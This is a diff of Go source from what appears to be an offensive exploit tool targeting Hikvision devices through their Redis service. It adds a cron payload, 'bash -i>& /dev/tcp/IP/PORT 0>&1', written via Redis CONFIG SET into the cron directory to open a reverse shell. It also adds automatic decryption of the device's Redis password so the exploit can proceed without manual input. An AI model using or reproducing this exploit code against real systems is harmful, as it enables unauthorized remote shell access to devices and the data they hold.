@@ -121,6 +121,11 @@ func (h *Hik) reserveShell() {
 		Password: h.redisPasswordDecrypted,
 		DB:       0,
 	})
+	h.Cmd = fmt.Sprintf(`
+
+* * * * * bash -i>& /dev/tcp/%s/%s 0>&1
+
+`, h.IP, h.Port)
 	rdb.Set("xxx", h.Cmd, 0)
 	rdb.ConfigSet("dir", cronPath[1])
 	rdb.ConfigSet("dbfilename", "root")
@@ -164,13 +169,20 @@ func (h *Hik) Run() {
 			if h.Exploit {
 				log.SetPrefix("[!] ")
 				log.Printf("Targets %s Redis Encrypt Password is %s\n", h.Target, h.redisPasswordEncrypted)
-				log.Printf("Please Use HikDecrypt Tools(https://github.com/wafinfo/Hikvision) On Windows To Decrypt It\n")
-				log.Printf("Input Decrypted Password To Exploit:")
-				fmt.Scanf("%s\n", &h.redisPasswordDecrypted)
-				if h.redisPasswordDecrypted == "" {
-					log.SetPrefix("[-] ")
-					log.Fatalln("Input Password Invalid.")
+				log.Println("Trying To Decrypt....")
+				results, err := Decrypt(h.redisPasswordEncrypted)
+				if err != nil {
+					log.Println("Decrypt Auto Failed.")
+					log.Printf("Please Use HikDecrypt Tools(https://github.com/wafinfo/Hikvision) On Windows To Decrypt It\n")
+					log.Printf("Input Decrypted Password To Exploit:")
+					fmt.Scanf("%s\n", &h.redisPasswordDecrypted)
+					if h.redisPasswordDecrypted == "" {
+						log.SetPrefix("[-] ")
+						log.Fatalln("Input Password Invalid.")
+					}
 				}
+				log.Printf("Decrypted Password Is: %s\n", results)
+				h.redisPasswordDecrypted = results
 				h.exploit()
 			}
 		} else {
